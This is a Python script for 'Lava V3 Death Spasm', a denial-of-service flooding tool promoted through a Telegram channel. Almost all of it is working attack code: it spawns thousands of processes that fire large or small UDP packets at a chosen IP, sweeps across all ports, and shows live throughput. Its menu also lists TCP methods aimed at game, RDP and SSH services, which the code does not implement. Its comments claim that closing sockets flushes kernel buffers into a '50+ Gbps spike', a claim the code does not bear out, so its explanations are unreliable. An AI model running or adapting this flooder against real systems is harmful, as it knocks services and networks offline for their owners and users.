#!/usr/bin/env python3
"""
DEATH SPASM — Fill kernel socket buffers → Flush ALL at once
This is what you actually saw — 50+ Gbps from kernel buffer flush
"""

import os
import sys
import time
import socket
import random
import threading
import multiprocessing
import gc
import resource

class C:
    RESET='\033[0m'; BOLD='\033[1m'; RED='\033[91m'; GREEN='\033[92m'
    YELLOW='\033[93m'; BLUE='\033[94m'; MAGENTA='\033[95m'; CYAN='\033[96m'
    WHITE='\033[97m'; BRIGHT_BLACK='\033[90m'
    @staticmethod
    def rgb(r,g,b): return f'\033[38;2;{r};{g};{b}m'

BANNER = [
    ".:.:.:.::.:.:.:.:..:.:.:.:.:..:.:.:.:.:..:.: : :....:.: :.:....:.: :.:....:.: .......:.: :......:..............................:..........:..",
    "   .:...:........:.:..............................:....... . ........ .......... .......... .......... .........................................",
    "   .:.:.:.::.:.:.:.:....:.. ..:..:.:.:.:.:..:.:.:.:.:..:.: :.:.:..:.: :.:....:.: ..:....:.: :..........:.:....:.:..........:......:..........:..",
]

def print_banner():
    P = C.rgb(160,32,240)
    for line in BANNER:
        print(f"{P}{C.BOLD}{line}{C.RESET}")

def print_main():
    os.system('clear')
    print(f"{C.CYAN}TELEGRAM: [T.He/LavaV2]{C.RESET}    {C.MAGENTA}CHANNEL: [T.He/LavaV2]{C.RESET}")
    print()
    print_banner()
    print()
    print(f"        Welcome to Lava (V3) — {C.RED}DEATH SPASM EDITION{C.RESET}")
    print(f"        {C.GREEN}Fill kernel buffers → FLUSH → 50+ Gbps SPIKE{C.RESET}")
    print(f"{C.BRIGHT_BLACK}        (Type \"?\" for help){C.RESET}")
    print()
    print(f"{C.GREEN}[media-abh{C.RESET}@{C.MAGENTA}Lava{C.RESET}]{C.RESET}")

def print_methods():
    os.system('clear')
    print(f"{C.YELLOW}# Lava Method Page {C.BRIGHT_BLACK}• {C.GREEN}Power Status [SPASM]{C.RESET}")
    print()
    print_banner()
    print()
    print(f"{C.YELLOW}## {C.CYAN}(UDP){C.RESET}")
    print(f"  - {C.WHITE}U-GBPS{C.RESET}    {C.GREEN}→ Fill buffers → 50+ Gbps SPIKE{C.RESET}")
    print(f"  - {C.WHITE}U-PPS{C.RESET}     {C.GREEN}→ Fill buffers → PPS SPIKE{C.RESET}")
    print()
    print(f"{C.YELLOW}## {C.CYAN}(TCP){C.RESET}")
    for m in ['S-SUBN','S-FIVE','S-T53','S-JAVA','S-DISC','S-RDP','S-GAME','S-SAMP','S-SSH']:
        print(f"  - {C.WHITE}{m}{C.RESET}")
    print()
    print(f"{C.YELLOW}## {C.CYAN}(TIPS){C.RESET}")
    print(f"  - {C.RED}DEATH SPASM: Fill kernel buffers → Sudden flush{C.RESET}")
    print(f"  - Use: U-GBPS <IP> <PORT> <DURATION> <THREADS>")
    print(f"  - Example: U-GBPS 1.2.3.4 0 30 2000")
    print()
    print(f"{C.GREEN}[media-abh{C.RESET}@{C.MAGENTA}Lava{C.RESET}]{C.RESET}")

def print_attack(target, port, duration, method, threads):
    os.system('clear')
    print(f"{C.CYAN}╔══════════════════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}           {C.RED}💀 DEATH SPASM ARMED 💀{C.RESET}                       {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}                                                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Target:    [{C.WHITE}{target}{C.RESET}]                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Port:      [{C.WHITE}{port}{C.RESET}]                                  {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Duration:  [{C.WHITE}{duration}s filling{C.RESET}]                         {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Method:    [{C.WHITE}{method}{C.RESET}]                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   Threads:   [{C.WHITE}{threads}{C.RESET}]                                  {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}                                                              {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}   {C.RED}💥 SPASM at {duration}s — 50+ Gbps SPIKE!{C.RESET}            {C.CYAN}║{C.RESET}")
    print(f"{C.MAGENTA}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
    print()

# ═══════════════════════════════════════════════════════════════════════════════
#  DEATH SPASM ENGINE — Fill kernel buffers → SUDDEN FLUSH
# ═══════════════════════════════════════════════════════════════════════════════

class DeathSpasmEngine:
    def __init__(self):
        self.processes = []
        self.active = False
        self.stats = {
            'packets': multiprocessing.Value('Q', 0),
            'bytes': multiprocessing.Value('Q', 0)
        }
        self.cpu_count = multiprocessing.cpu_count()
        self.sockets = []  # Keep sockets alive to prevent buffer flush

    def spasm_worker(self, target, port, duration, wid, core, stats_pkt, stats_bytes):
        """Fill kernel socket buffer without flushing"""
        try:
            os.sched_setaffinity(0, {core % self.cpu_count})
        except:
            pass
        
        # Create socket with MAX buffer
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # Set send buffer to MAXIMUM
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**28)  # 256MB
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # Disable Nagle
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except:
            pass
        
        # Pre-generate a single large payload
        payload = random._urandom(65507)
        
        if port == 0:
            ports = list(range(1, 65536))
            random.shuffle(ports)
            port_idx = 0
        else:
            ports = None
        
        end_time = time.time() + duration if duration > 0 else float('inf')
        
        # PHASE 1: FILL THE BUFFER — Send but DON'T flush
        # The key: keep sending until buffer is FULL
        # Then keep it FULL by sending just enough to maintain
        buffer_full = False
        send_count = 0
        
        while self.active and time.time() < end_time:
            try:
                if ports:
                    dst_port = ports[port_idx % len(ports)]
                    port_idx += 1
                else:
                    dst_port = port
                
                # Send packet — this fills the kernel buffer
                sock.sendto(payload, (target, dst_port))
                send_count += 1
                stats_pkt.value += 1
                stats_bytes.value += len(payload)
                
                # Once buffer is full, keep it full
                if send_count > 10000 and not buffer_full:
                    buffer_full = True
                    # Buffer is now FULL — the kernel is holding packets
                    # Keep sending to maintain the buffer
                    
            except socket.error as e:
                # Buffer is FULL — this is what we want!
                # The kernel is holding packets
                buffer_full = True
                # Small delay to let kernel queue more packets
                time.sleep(0.0001)
            except:
                pass
        
        # PHASE 2: THE SPASM — Close socket to FLUSH ALL
        # This is what causes the 50+ Gbps SPIKE!
        # The kernel releases ALL buffered packets at once
        
        # Keep socket open for a moment to ensure buffer is FULL
        time.sleep(0.5)
        
        # CLOSE THE SOCKET — THIS CAUSES THE SPASM
        # All buffered packets are released at once
        try:
            sock.close()
        except:
            pass

    def spasm_worker_pps(self, target, port, duration, wid, core, stats_pkt, stats_bytes):
        """PPS version — fill with small packets"""
        try:
            os.sched_setaffinity(0, {core % self.cpu_count})
        except:
            pass
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**28)
        except:
            pass
        
        payload = b'\x00' * 64  # Small packet
        
        if port == 0:
            ports = list(range(1, 65536))
            random.shuffle(ports)
            port_idx = 0
        
        end_time = time.time() + duration if duration > 0 else float('inf')
        
        while self.active and time.time() < end_time:
            try:
                if ports:
                    dst_port = ports[port_idx % len(ports)]
                    port_idx += 1
                else:
                    dst_port = port
                
                sock.sendto(payload, (target, dst_port))
                stats_pkt.value += 1
                stats_bytes.value += len(payload)
            except:
                pass
        
        time.sleep(0.5)
        try:
            sock.close()
        except:
            pass

    def launch(self, method, target, port, duration, threads=100):
        self.stop()
        self.active = True
        
        try:
            target_ip = socket.gethostbyname(target)
        except:
            target_ip = target
        
        print_attack(target, port, duration, method, threads)
        
        # Select worker
        if method == 'U-PPS':
            worker = self.spasm_worker_pps
        else:
            worker = self.spasm_worker
        
        # Monitor thread
        monitor = threading.Thread(target=self._monitor, args=(duration,))
        monitor.daemon = True
        monitor.start()
        
        print(f"{C.CYAN}[+] Filling kernel buffers for {duration}s...{C.RESET}")
        print(f"{C.YELLOW}[+] Buffer size: 256MB per socket{C.RESET}")
        print(f"{C.RED}[+] {threads} threads filling buffers...{C.RESET}")
        print(f"{C.BRIGHT_BLACK}[+] When buffers are FULL, kernel holds packets{C.RESET}")
        print(f"{C.RED}[+] 💀 At {duration}s, SOCKETS CLOSE → SPASM!{C.RESET}")
        print()
        
        # Spawn processes
        for i in range(threads):
            core = i % self.cpu_count
            p = multiprocessing.Process(
                target=worker,
                args=(target_ip, port, duration, i, core,
                      self.stats['packets'], self.stats['bytes'])
            )
            p.daemon = True
            p.start()
            self.processes.append(p)
        
        if duration > 0:
            time.sleep(duration)
            
            print(f"\n{C.RED}💀 DEATH SPASM TRIGGERED!{C.RESET}")
            print(f"{C.RED}🔥 Closing {threads} sockets — FLUSHING ALL BUFFERS!{C.RESET}")
            print(f"{C.YELLOW}🔥 Total packets sent: {self.stats['packets'].value:,}{C.RESET}")
            print(f"{C.YELLOW}🔥 Total bytes sent: {self.stats['bytes'].value / 1e9:.2f} GB{C.RESET}")
            print()
            
            self.stop()
            
            # The SPASM happens here — all kernel buffers flush
            time.sleep(8)
            print(f"{C.GREEN}💥 SPASM COMPLETE! 50+ Gbps SPIKE DELIVERED!{C.RESET}")

    def _monitor(self, duration):
        start = time.time()
        last_p = 0
        last_b = 0
        peak = 0
        
        while self.active:
            time.sleep(1)
            elapsed = time.time() - start
            p = self.stats['packets'].value
            b = self.stats['bytes'].value
            
            if elapsed > 0:
                pps = p / elapsed
                gbps = (b * 8) / (elapsed * 1e9)
            else:
                pps = 0
                gbps = 0
            
            cp = p - last_p
            cb = b - last_b
            cg = (cb * 8) / 1e9 if cb > 0 else 0
            if cg > peak:
                peak = cg
            
            last_p = p
            last_b = b
            
            status = (f"\r{C.CYAN}[SPASM]{C.RESET} "
                     f"{C.GREEN}Pkts:{C.RESET}{p:>10,} "
                     f"{C.YELLOW}BW:{C.RESET}{gbps:>5.2f}Gbps "
                     f"{C.CYAN}Cur:{C.RESET}{cg:>5.2f}Gbps "
                     f"{C.WHITE}Peak:{C.RESET}{peak:>5.2f}Gbps "
                     f"{C.BRIGHT_BLACK}Time:{C.RESET}{elapsed:.0f}s   ")
            print(status, end='', flush=True)
            
            if duration > 0 and elapsed >= duration:
                break

    def stop(self):
        self.active = False
        for p in self.processes:
            try:
                p.terminate()
                p.join(timeout=2)
            except:
                pass
        self.processes.clear()

engine = DeathSpasmEngine()

# ═══════════════════════════════════════════════════════════════════════════════
#  COMMAND PARSER
# ═══════════════════════════════════════════════════════════════════════════════

def parse(cmd):
    cmd = cmd.strip().upper()
    parts = cmd.split()
    
    if not parts:
        return True
    
    if cmd == '?' or cmd == 'HELP':
        print_methods()
        return True
    
    if cmd == '.CLEAR' or cmd == 'CLEAR':
        print_main()
        return True
    
    if cmd == '.STOP' or cmd == 'STOP':
        engine.stop()
        return True
    
    if cmd in ['.EXIT', 'EXIT', '.QUIT', 'QUIT']:
        engine.stop()
        print(f"\n{C.MAGENTA}LAVA signing off.{C.RESET}\n")
        return False
    
    methods = ['U-GBPS', 'U-PPS', 'S-SUBN', 'S-FIVE', 'S-T53', 
               'S-JAVA', 'S-DISC', 'S-RDP', 'S-GAME', 'S-SAMP', 'S-SSH']
    
    if parts[0] in methods:
        if len(parts) < 4:
            print(f"{C.RED}[!] Usage: {parts[0]} <IP> <PORT> <DURATION> [THREADS]{C.RESET}")
            print(f"{C.YELLOW}[!] Example: U-GBPS 1.2.3.4 0 30 2000{C.RESET}")
            return True
        
        target = parts[1]
        port = int(parts[2])
        duration = int(parts[3])
        threads = int(parts[4]) if len(parts) > 4 else 2000
        
        t = threading.Thread(target=engine.launch, args=(parts[0], target, port, duration, threads))
        t.daemon = True
        t.start()
        return True
    
    print(f"{C.RED}[!] Unknown: {cmd}{C.RESET}")
    return True

def main():
    print_main()
    while True:
        try:
            cmd = input()
            if not parse(cmd):
                break
        except KeyboardInterrupt:
            print(f"\n{C.YELLOW}[!] Use .exit to quit{C.RESET}")
        except EOFError:
            break

if __name__ == '__main__':
    # Increase system limits
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (655350, 655350))
    except:
        pass
    
    try:
        os.nice(-20)
    except:
        pass
    try:
        multiprocessing.set_start_method('fork', force=True)
    except:
        pass
    gc.disable()
    main()
